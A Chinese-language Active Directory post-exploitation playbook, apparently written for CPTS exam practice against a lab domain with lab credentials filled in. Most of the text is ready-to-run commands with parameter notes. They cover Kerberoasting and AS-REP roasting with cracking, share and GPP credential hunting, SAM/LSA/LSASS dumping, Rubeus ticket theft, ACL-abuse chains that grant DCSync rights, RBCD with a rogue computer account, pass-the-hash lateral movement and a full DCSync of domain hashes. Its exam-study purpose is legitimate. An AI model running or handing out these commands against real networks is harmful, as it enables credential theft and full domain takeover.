# CPTS AD 後滲透作戰手冊（ATT&CK 對照 · 確定性指令版）

> 用途：拿到內網 foothold 後，系統性列舉 → 取憑證 → 提權 → 網域宰制。
> 換目標時**只需改「§0 變數區」一塊**，全文指令都引用這些變數。
> 每個指令的關鍵參數都有註解，方便你自己替換。
>
> 攻擊機：`10.10.14.30`（user: wayne） · 本手冊假設你已經有 chisel/SOCKS 跳板在跑。

---

## §0 變數區 —— 換目標只改這裡

```bash
# ========== 目標身分（每換一個帳號就改這 3~4 行）==========
export DOMAIN='ad.trilocor.local'         # 網域 FQDN
export DC_IP='172.16.139.3'               # DC 的 IP
export DC_HOST='DC01'                      # DC 主機名
export DC_FQDN="${DC_HOST}.${DOMAIN}"      # 自動組成 DC01.ad.trilocor.local
export U='sqldev'                          # 目前用的帳號
export P='1212developer'                   # 密碼；用 hash 認證時把這行留空 P=''
export H=''                                # NT hash；用密碼時留空。PtH 時填這個

# ========== 內網範圍 / 其他主機（依考試改）==========
export SUBNET='172.16.139.0/24'
export SRV01='172.16.139.35'
export WKS01='172.16.139.175'

# ========== 環境（一次設好，通常不用動）==========
export PC='/tmp/pc-chisel-1082.conf'       # proxychains 設定檔
export OUT='/mnt/c/Users/ox060/Downloads/CPST'   # 輸出目錄
export PYTHON='/home/wayne/.local/share/pipx/venvs/impacket/bin/python3'
export IMP='/home/wayne/.local/share/pipx/venvs/impacket/bin'   # impacket 腳本目錄
mkdir -p "$OUT"

# ========== 認證字串小工具（自動判斷用密碼還是 hash）==========
# 用法：$(creds)  會展開成  ad.trilocor.local/sqldev:密碼   或   .../sqldev  (hash 走 -hashes)
creds() { if [ -n "$P" ]; then echo "${DOMAIN}/${U}:${P}"; else echo "${DOMAIN}/${U}"; fi; }
# nxc 用的認證參數：$(nxcauth) → -u sqldev -p 密碼  或  -u sqldev -H hash
nxcauth() { if [ -n "$P" ]; then echo "-u $U -p $P"; else echo "-u $U -H $H"; fi; }
```

### Kerberos 時鐘校正（透過 proxychains 打 Kerberos 必用）

WSL2 本機時間 ≠ DC 時間會直接噴 `KRB_AP_ERR_SKEW`。把這個函式貼進 shell，之後所有 Kerberos 操作前面加 `TZ=UTC faketime "$(dctime)"`。

```bash
dctime() {
  local CT
  CT=$(proxychains4 -q -f "$PC" ldapsearch -x -H "ldap://$DC_IP" \
       -D "${U}@${DOMAIN}" -w "$P" -b '' -s base currentTime 2>/dev/null \
       | awk '/^currentTime:/{print $2}')
  echo "${CT:0:4}-${CT:4:2}-${CT:6:2} ${CT:8:2}:${CT:10:2}:${CT:12:2}"
}
# 範例： TZ=UTC faketime "$(dctime)" proxychains4 -f $PC $PYTHON $IMP/GetUserSPNs.py ...
```

---

## §決策順序（拿到 foothold 後照這個跑，不要臨場想）

```
1. 基線列舉（§2）           →  搞清楚有誰、有什麼群組、密碼政策
2. BloodHound 收集（§3）    →  用「當前這個帳號」跑一次，標記 owned
3. Roasting（§4）           →  Kerberoast + ASREPRoast
4. 共享 / GPP / 檔案（§5）  →  ★你上次的最大缺口★ 憑證常藏這裡
5. 拿到 SYSTEM → 主機祕密（§6）
6. Session / 委派 狩獵（§7） →  ★缺口★ 找 DA 活 session、找委派
7. 提權向量（§8）           →  ADCS / LAPS / ACL 鏈 / RBCD
8. 橫向（§9）→ 網域宰制（§10）
※ 每拿到「任何一個新憑證」，立刻跑 §11 的迴圈，不要跳過。
```

---

## §1 主機 / 服務探索  `T1046 · T1018`

```bash
# 掃內網活主機（SMB 回應）
proxychains4 -f $PC nxc smb $SUBNET 2>/dev/null | tee $OUT/hosts_smb.txt
#   ↑ 不帶帳密只列出主機名/網域/簽章狀態，快速盤點

# 對單一主機做服務指紋（走 socks，-sT 全連線、-Pn 跳過 ping）
proxychains4 -f $PC nmap -sT -Pn -n -p 88,135,139,389,445,464,636,3268,3389,5985,5986,1433 $DC_IP -oN $OUT/nmap_dc.txt
#   -sT  = TCP connect（proxychains 只能走這個，不能 -sS）
#   -Pn  = 不做主機存活偵測    -n = 不做 DNS 反查（proxychains 下會卡）
```

---

## §2 網域基線列舉  `T1087 · T1069 · T1201 · T1482`

```bash
# 密碼政策 —— 決定能不能安全噴灑（看鎖定閾值！）
proxychains4 -f $PC nxc smb $DC_IP $(nxcauth) --pass-pol 2>/dev/null | tee $OUT/passpol.txt

# 全部使用者（存純帳號清單，後面 ASREPRoast / 噴灑要用）
proxychains4 -f $PC nxc ldap $DC_IP $(nxcauth) --users 2>/dev/null | tee $OUT/users_raw.txt
awk 'NR>4{print $5}' $OUT/users_raw.txt | grep . | sort -u > $OUT/users.txt

# 全部群組 + 高權群組成員
proxychains4 -f $PC nxc ldap $DC_IP $(nxcauth) --groups 2>/dev/null | tee $OUT/groups.txt
proxychains4 -f $PC nxc ldap $DC_IP $(nxcauth) --admin-count 2>/dev/null | tee $OUT/admincount.txt
#   --admin-count = 列出 adminCount=1 的物件（受 AdminSDHolder 保護的高權帳號）

# ★描述欄位藏密碼（超常見，上次沒做）★
proxychains4 -f $PC nxc ldap $DC_IP $(nxcauth) -M user-desc 2>/dev/null | tee $OUT/user_desc.txt

# 網域信任（多網域題型才需要）
proxychains4 -f $PC nxc ldap $DC_IP $(nxcauth) -M enum_trusts 2>/dev/null

# 手動 LDAP 查單一帳號的群組（$TARGET 換成想查的帳號）
TARGET='bvincent'
proxychains4 -f $PC ldapsearch -x -H ldap://$DC_IP -D "${U}@${DOMAIN}" -w "$P" \
  -b "DC=${DOMAIN//./,DC=}" "(sAMAccountName=${TARGET})" memberOf servicePrincipalName userAccountControl 2>/dev/null
#   -b DC=ad,DC=trilocor,DC=local（上面那串 ${DOMAIN//./,DC=} 會自動組出來）
```

---

## §3 BloodHound 收集（★每個帳號都要跑一次★）  `T1069`

> 上次只分析了 4 個帳號的 ACL。回饋原話：**每拿到一組新憑證，就把它能存取/讀寫的每個物件徹底列一遍。** 這節就是強制執行這件事。

```bash
# 用「當前帳號」收集（proxychains 下 DNS 走 TCP，一定要 --dns-tcp）
proxychains4 -f $PC bloodhound-python -d $DOMAIN -u "$U" -p "$P" \
  -dc $DC_FQDN -ns $DC_IP -c All --zip --dns-tcp -op "$OUT/bh_${U}_" 2>/dev/null
#   -c All   = 收集所有蒐集方法（含 ACL/Session/Trusts）
#   -op      = 輸出檔名前綴，用帳號名區分不同視角
#   hash 認證改成： --hashes :$H  （拿掉 -p "$P"）
```

匯入 BloodHound GUI 後，**必做動作**：

1. 對**每個你已擁有的帳號/機器**按右鍵 → `Mark as Owned`。
2. 跑 `Shortest Paths from Owned Principals` 這個內建查詢。
3. 對目標（Domain Admins / DC）跑 `Shortest Paths to Domain Admins`。
4. Cypher 找出站可濫用邊：
   ```
   MATCH p=(n {owned:true})-[:ForceChangePassword|GenericAll|GenericWrite|WriteOwner|WriteDacl|AddMember|AllExtendedRights|AddSelf|Owns]->(m) RETURN p
   ```

---

## §4 Roasting  `T1558.003 Kerberoast · T1558.004 ASREPRoast`

```bash
# ---- Kerberoast（要有效帳密）----
TZ=UTC faketime "$(dctime)" proxychains4 -f $PC $PYTHON $IMP/GetUserSPNs.py \
  "$(creds)" -dc-ip $DC_IP -request -outputfile $OUT/kerb.hash 2>&1 | tee $OUT/kerb.log
#   -request      = 直接請求 TGS 並輸出 hash
#   -outputfile   = 存 hashcat 格式
hashcat -m 13100 $OUT/kerb.hash /usr/share/wordlists/rockyou.txt --force
#   -m 13100 = Kerberos 5 TGS-REP (etype 23)

# ---- ASREPRoast（找不需預驗證的帳號）----
# 對整份使用者清單噴（不需密碼，只要能連 DC）
proxychains4 -f $PC $PYTHON $IMP/GetNPUsers.py "${DOMAIN}/" -usersfile $OUT/users.txt \
  -dc-ip $DC_IP -no-pass -request -outputfile $OUT/asrep.hash 2>/dev/null | tee $OUT/asrep.log
hashcat -m 18200 $OUT/asrep.hash /usr/share/wordlists/rockyou.txt --force
#   -m 18200 = Kerberos 5 AS-REP (etype 23)

# ★破解時務必加規則，不要只跑裸字典★（上次可能就差這步）
hashcat -m 13100 $OUT/kerb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

---

## §5 共享 / GPP / 檔案憑證狩獵（★上次最大缺口★）  `T1135 · T1552.001 · T1552.006`

> 你上次 Phase 11 標「待執行」就沒跑；DC01 一堆可讀共享也只列了清單沒進去翻。phernandez 的憑證極可能就躺在這裡。這節**一定要跑完**。

```bash
# 列出所有共享 + 讀寫權限
proxychains4 -f $PC nxc smb $DC_IP $(nxcauth) --shares 2>/dev/null | tee $OUT/shares.txt

# ★遞迴爬「所有可讀共享」的檔案清單（不含 print$/ipc$）★
proxychains4 -f $PC nxc smb $DC_IP $(nxcauth) -M spider_plus 2>/dev/null
#   結果 JSON 通常在 ~/.nxc/modules/nxc_spider_plus/ 或 /tmp/nxc_hosted/
#   → 開來搜副檔名：.config .xml .ps1 .bat .kdbx .txt .ini .vbs .cmd unattend web.config

# GPP cpassword（SYSVOL 內加密明文密碼，AES 金鑰是微軟公開的 → 必破）
proxychains4 -f $PC nxc smb $DC_IP $(nxcauth) -M gpp_password  2>/dev/null | tee $OUT/gpp_pass.txt
proxychains4 -f $PC nxc smb $DC_IP $(nxcauth) -M gpp_autologin 2>/dev/null | tee $OUT/gpp_auto.txt

# SYSVOL / NETLOGON 腳本翻密碼關鍵字
proxychains4 -f $PC nxc smb $DC_IP $(nxcauth) \
  --spider SYSVOL --regex '(?i)(password|passwd|pwd|cpassword|secret|apikey|connectionstring)' 2>/dev/null \
  | tee $OUT/sysvol_grep.txt

# 手動掛載可讀共享逐一翻（$SHARE 換成 shares.txt 裡看到的名字）
SHARE='Projects'
proxychains4 -f $PC smbclient "//$DC_IP/$SHARE" -U "${DOMAIN}\\${U}%${P}" -c 'recurse ON; ls'
#   看到有料的檔案就 get 下來：  -c 'get "路徑\檔名"'
```

**翻到檔案後的重點清單**：`.kdbx`(KeePass)、`web.config`/`appsettings.json`(連線字串)、`*.ps1`/`*.bat`(硬編碼密碼)、`unattend.xml`/`sysprep.xml`、`id_rsa`/`.ppk`、瀏覽器匯出、`.vmx`/`.rdp`、備份檔 `.bak`。

---

## §6 主機祕密提取（拿到本機/網域 admin 後）  `T1003.* · T1555`

```bash
# 遠端一次拉 SAM + LSA secrets + LSASS（本機管理員 NTLM）
proxychains4 -f $PC nxc smb $WKS01 -u Administrator -H <本機ADMIN_NTLM> --local-auth \
  --sam --lsa 2>/dev/null | tee $OUT/wks01_secrets.txt
#   --sam = 本機帳號 hash   --lsa = LSA secrets（含 DCC2 快取、服務帳號明文）
proxychains4 -f $PC nxc smb $WKS01 -u Administrator -H <本機ADMIN_NTLM> --local-auth \
  -M lsassy 2>/dev/null | tee $OUT/wks01_lsassy.txt
#   lsassy = 遠端解析 lsass，抓「當前登入」帳號的明文/hash

# impacket 完整版（含 DCC2、DPAPI 選項）
proxychains4 -f $PC $PYTHON $IMP/secretsdump.py -hashes :<本機ADMIN_NTLM> Administrator@$WKS01 \
  2>/dev/null | tee $OUT/wks01_secretsdump.txt
```

**在被控 Windows 主機上（RDP/WinRM）額外要翻的**（這些遠端抓不到）：

```powershell
# PowerShell 歷史（常有人把密碼打在指令裡）
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Credential Manager
cmdkey /list
# DPAPI 保護的憑證（用 SharpDPAPI / mimikatz）
# 找 KeePass、瀏覽器、.rdp、每個使用者桌面與 Documents
Get-ChildItem C:\Users\*\Desktop,C:\Users\*\Documents -Recurse -Include *.txt,*.kdbx,*.config,*.ps1,*.xml -EA 0
# ★非標準已安裝軟體（回饋特別點名）→ 找它的設定檔/服務/CVE★
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion | Sort DisplayName
Get-CimInstance win32_service | ? {$_.PathName -notlike '*System32*'} | Select Name,PathName,StartName
```

> 你上次用 Sublime session 檔挖到 devuser_1 —— 這招**每台機器、每個使用者 profile 都要重做一遍**，不是做一次就算。

---

## §7 Session / 委派 / 票證狩獵（★缺口★）  `T1550 · T1558 · T1134`

> `AD\Administrator` 的 DCC2 出現在 WKS01 = **有網域管理員登入過 WKS01**。正解不是爆 DCC2（DCC2 不能 PtH、不能換 TGT、只能離線爆、rockyou 爆不出就是死路），而是**在你有 SYSTEM 的機器上蹲、等 DA 活 session 出現直接偷票**。

```bash
# 掃全網「誰登入在哪台」→ 找 DA / 高權帳號的活 session
proxychains4 -f $PC nxc smb $SUBNET $(nxcauth) --loggedon-users 2>/dev/null | tee $OUT/loggedon.txt
proxychains4 -f $PC nxc smb $SUBNET $(nxcauth) --sessions       2>/dev/null | tee $OUT/sessions.txt

# 委派枚舉（三種都要看）
proxychains4 -f $PC nxc ldap $DC_IP $(nxcauth) --find-delegation 2>/dev/null | tee $OUT/deleg.txt
#   非約束(Unconstrained) / 約束(Constrained) / 資源型(RBCD)
proxychains4 -f $PC nxc ldap $DC_IP $(nxcauth) --trusted-for-delegation 2>/dev/null
```

**在有 SYSTEM 的 Windows 主機上抓活票（Rubeus）**：

```powershell
.\Rubeus.exe triage          # 列出當前所有 TGT/TGS，看有沒有 DA 的票
.\Rubeus.exe dump /nowrap    # 匯出票證 base64 → 回 Kali 轉檔用
# 若有 DA 的 TGT → 直接 PtT，見 §9
```

---

## §8 提權向量系統化  `T1649 ADCS · LAPS · ACL 濫用 · RBCD`

```bash
# ---- ADCS（ESC1-8）----
proxychains4 -f $PC certipy find -u "${U}@${DOMAIN}" -p "$P" -dc-ip $DC_IP \
  -ns $DC_IP -dns-tcp -stdout -vulnerable 2>/dev/null | tee $OUT/adcs.txt
#   -vulnerable = 只列出可被濫用的模板（有 CA 才有東西）

# ---- LAPS（若部署，可讀本機 admin 明文）----
proxychains4 -f $PC nxc ldap $DC_IP $(nxcauth) -M laps 2>/dev/null | tee $OUT/laps.txt
```

### ACL 濫用鏈（你上次已畫好 phernandez→DCSync，這裡是可直接套的模板）

> 每一步都以「你拿到鏈上前一個帳號」為前提。變數 `$AU/$AP` = 攻擊者當前帳號/密碼，`$TGT` = 下一個目標。

```bash
# ForceChangePassword：改掉目標密碼（不需知道原密碼）
proxychains4 -f $PC $PYTHON $IMP/changepasswd.py \
  "${DOMAIN}/${AU}:${AP}@${DC_IP}" -newpass 'Pwned1234!' -altuser "$TGT" -altdomain $DOMAIN

# AddMember：把自己/目標加進群組
proxychains4 -f $PC net rpc group addmem "目標群組" "$TGT" \
  -U "${DOMAIN}/${AU}%${AP}" -S $DC_IP

# GenericWrite → Targeted Kerberoast（幫目標設 SPN 再 roast）
proxychains4 -f $PC $PYTHON /path/to/targetedKerberoast.py \
  -u "$AU" -p "$AP" -d $DOMAIN --dc-ip $DC_IP -o $OUT/targeted.hash

# WriteOwner → 改擁有者 → 給自己 DCSync 權
proxychains4 -f $PC $PYTHON $IMP/owneredit.py -action write -new-owner "$AU" \
  -target-dn "CN=目標,CN=Users,DC=ad,DC=trilocor,DC=local" "${DOMAIN}/${AU}:${AP}" -dc-ip $DC_IP
proxychains4 -f $PC $PYTHON $IMP/dacledit.py -action write -rights DCSync -principal "$AU" \
  -target-dn "DC=ad,DC=trilocor,DC=local" "${DOMAIN}/${AU}:${AP}" -dc-ip $DC_IP

# RBCD（有 GenericWrite 到某台電腦物件時）
proxychains4 -f $PC $PYTHON $IMP/addcomputer.py "$(creds)" -dc-ip $DC_IP \
  -computer-name 'EVIL$' -computer-pass 'Evil123!'
proxychains4 -f $PC $PYTHON $IMP/rbcd.py -delegate-from 'EVIL$' -delegate-to '目標電腦$' \
  -action write "$(creds)" -dc-ip $DC_IP
```

---

## §9 橫向移動  `T1021 · T1550.002 PtH · T1550.003 PtT`

```bash
# 先確認這組憑證在哪些主機是 admin（Pwn3d!）
proxychains4 -f $PC nxc smb $SUBNET $(nxcauth) 2>/dev/null | grep -i pwn3d

# WinRM 執行（密碼或 hash）
proxychains4 -f $PC nxc winrm <host> $(nxcauth) -x 'whoami /all' 2>/dev/null
proxychains4 -f $PC evil-winrm -i <host> -u $U -H $H          # PtH 進互動 shell

# SMB 執行 / 取旗標
proxychains4 -f $PC nxc smb <host> $(nxcauth) -x 'type C:\Users\Administrator\Desktop\flag.txt' 2>/dev/null

# Pass-the-Ticket（§7 抓到票後）
export KRB5CCNAME=$OUT/da.ccache
proxychains4 -f $PC nxc smb $DC_IP --use-kcache -x 'whoami' 2>/dev/null
```

---

## §10 網域宰制  `T1003.006 DCSync`

```bash
# 拿到有 DCSync 權的帳號後，dump krbtgt + Administrator
TZ=UTC faketime "$(dctime)" proxychains4 -f $PC $PYTHON $IMP/secretsdump.py \
  "$(creds)@${DC_IP}" -just-dc 2>/dev/null | tee $OUT/dcsync.txt
#   -just-dc     = 只拉網域帳號 hash（krbtgt/Administrator/所有 user）
#   -just-dc-user Administrator   ← 只要單一帳號時加這個

# 用 Administrator NTLM PtH 拿 DC root flag
proxychains4 -f $PC nxc smb $DC_IP -u Administrator -H <DCSYNC出來的NTLM> \
  -x 'type C:\Users\Administrator\Desktop\root.txt' 2>/dev/null | tee $OUT/root_flag.txt
```

---

## §11 ★每拿到「任何一個新憑證」立刻跑這 8 條★

> 這是把回饋第一點變成肌肉記憶的核心。改 §0 的 `U/P/H`，然後整段貼上。

```bash
echo "[*] 新憑證列舉：$U"
proxychains4 -f $PC nxc smb  $DC_IP $(nxcauth) --shares 2>/dev/null            # 1 這帳號能讀哪些共享
proxychains4 -f $PC nxc smb  $SUBNET $(nxcauth) 2>/dev/null | grep -i pwn3d    # 2 是不是哪台的 admin
proxychains4 -f $PC nxc ldap $DC_IP $(nxcauth) -M user-desc 2>/dev/null        # 3 描述欄密碼
proxychains4 -f $PC nxc smb  $DC_IP $(nxcauth) -M gpp_password 2>/dev/null     # 4 GPP
proxychains4 -f $PC nxc smb  $SUBNET $(nxcauth) --loggedon-users 2>/dev/null   # 5 能不能看到別人 session
proxychains4 -f $PC bloodhound-python -d $DOMAIN -u "$U" -p "$P" -dc $DC_FQDN \
  -ns $DC_IP -c All --zip --dns-tcp -op "$OUT/bh_${U}_" 2>/dev/null            # 6 重收 BH，標 owned 跑最短路徑
proxychains4 -f $PC certipy find -u "${U}@${DOMAIN}" -p "$P" -dc-ip $DC_IP -ns $DC_IP -dns-tcp -vulnerable -stdout 2>/dev/null  # 7 ADCS
TZ=UTC faketime "$(dctime)" proxychains4 -f $PC $PYTHON $IMP/GetUserSPNs.py "$(creds)" -dc-ip $DC_IP -request -outputfile $OUT/kerb_${U}.hash 2>/dev/null  # 8 這帳號視角 Kerberoast
```

---

## §12 死路辨識表 —— 看到這些就停手換方向（別再鑽）

| 症狀 | 為什麼是死路 | 該做什麼 |
|------|------------|---------|
| DCC2（`$DCC2$...`）rockyou Exhausted | DCC2 不能 PtH、不能換 TGT，只能離線爆；爆不出＝結束 | 改去蹲那台機器的**活 session**（§7），DCC2 存在＝有高權帳號登入過該機 |
| TGS/AS-REP hash 但該帳號無特殊群組 | 破了也只是低權帳號，對提權無幫助 | 不優先，先破**有群組**的帳號 |
| 密碼噴灑全 `STATUS_LOGON_FAILURE` | 密碼不在字典/根本沒弱密碼 | 停止噴灑，改走**檔案/共享/GPP**取憑證（§5） |
| ADCS `0 CAs` / LAPS 無屬性 | 環境根本沒部署 | 直接排除整條 ESC/LAPS 線，別再試 |
| LLMNR 毒化 30 分鐘無 hash | 目標可能不在同廣播段，或沒觸發 | 當**背景**掛著就好，不要當主線等它 |

---

## §13 紀律（回饋反覆強調，直接影響分數）

1. **拿到旗標立刻提交**，並把 flag 值當場記進筆記（你上次 Flag 5/6/7 只留 placeholder＝丟失可複查資訊）。
2. **每台主機、每個帳號，發現什麼都當場寫下來**——IP、帳號、hash、群組、共享、版本號。回饋原話：好幾次你離成功只差「回頭把兩筆紀錄串起來」。
3. 卡超過 ~45 分鐘就**換目標或休息**，回來換角度，不要單線鑽。
4. 每個 AD 列舉動作**至少兩種工具交叉**（nxc + BloodHound + 手動 ldapsearch），有些東西只有某個工具看得到。

---

## §附錄：ATT&CK 對照速查

| 階段 | Technique | 本手冊章節 |
|------|-----------|-----------|
| Discovery | T1087 Account / T1069 Groups / T1135 Shares / T1482 Trusts / T1046 Services | §1 §2 §3 |
| Credential Access | T1558.003 Kerberoast / T1558.004 ASREP / T1552.006 GPP / T1552.001 Files / T1003.* Dumping / T1555 Stores | §4 §5 §6 |
| Priv Esc | T1649 ADCS / T1098 Account Manip / T1222 ACL | §8 |
| Lateral | T1021 Remote Svc / T1550.002 PtH / T1550.003 PtT | §9 |
| Domain Dominance | T1003.006 DCSync | §10 |
